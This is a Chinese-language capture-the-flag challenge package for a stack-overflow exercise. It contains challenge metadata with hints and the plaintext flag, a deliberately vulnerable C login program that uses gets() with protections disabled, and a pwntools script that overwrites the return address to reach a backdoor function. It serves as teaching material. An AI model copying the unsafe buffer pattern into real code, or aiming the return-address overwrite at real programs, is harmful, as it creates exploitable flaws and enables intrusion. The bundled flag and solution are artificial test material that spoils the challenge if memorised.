# 💀 PWN 挑战 — 栈溢出入门

## challenge.yml
```yaml
name: "Stack Overflow 101 — 覆盖返回地址"
category: PWN
difficulty: Medium
points: 250
hints:
  - cost: 15
    text: "checksec 检查保护机制，看看有什么没开"
  - cost: 25
    text: "缓冲区大小是 64 字节，但可以输入更多"
  - cost: 30
    text: "目标函数地址可以用 objdump 或 gdb 找到"
flag: "CTF{st4ck_0v3rfl0w_g0t_m3_h3r3}"
```

## 题目描述
```
# Stack Overflow 101 — 覆盖返回地址

**难度**: ⭐⭐ Medium | **分数**: 250

## 场景
一个简单的登录程序，但缓冲区检查似乎有问题...
你能利用栈溢出跳转到隐藏的后门函数吗？

## 连接
nc pwn.challenges.local 1337

## 附件
- [vuln](./vuln) - 二进制文件
- [vuln.c](./vuln.c) - 源代码
```

## 出题源码 (C)
```c
// vuln.c — 编译: gcc -o vuln -fno-stack-protector -no-pie -z execstack vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// 目标函数 — 我们的"后门"
void backdoor() {
    system("cat /flag.txt");
}

void login() {
    char password[64];  // 缓冲区
    
    printf("Enter password: ");
    gets(password);      // ⚠️ 经典漏洞！gets() 不检查边界
    
    if (strcmp(password, "admin123") == 0) {
        printf("Login successful!\n");
    } else {
        printf("Wrong password!\n");
    }
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== Admin Panel Login ===\n");
    login();
    return 0;
}
```

## 利用脚本 (pwntools)
```python
from pwn import *

# 连接
r = remote('pwn.challenges.local', 1337)

# 找 backdoor 地址
# $ objdump -d vuln | grep backdoor
BACKDOOR = 0x4011d6  # 示例地址

# 构造 payload
# 缓冲区 64 字节 + RBP 8 字节 + 返回地址
payload = b'A' * 72           # 填充到返回地址
payload += p64(BACKDOOR)      # 覆盖返回地址

r.sendline(payload)
r.interactive()
```
